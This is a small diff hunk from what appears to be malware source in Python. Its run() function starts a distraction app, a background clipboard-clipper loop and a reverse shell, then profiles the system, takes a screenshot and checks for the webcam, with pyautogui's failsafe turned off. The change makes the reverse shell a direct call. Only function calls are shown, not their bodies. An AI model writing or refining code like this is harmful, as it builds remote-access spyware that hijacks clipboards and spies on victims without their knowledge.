@@ -478,7 +478,7 @@ pyautogui.FAILSAFE = False
 def run():
     launch_distraction_app()
     threading.Thread(target=clipper_loop, daemon=True).start()
-    threading.Thread(target=reverse_shell, daemon=True).start()  # ← NEW LINE
+    reverse_shell()
     profile_system()
     take_screenshot()
     if check_webcam():
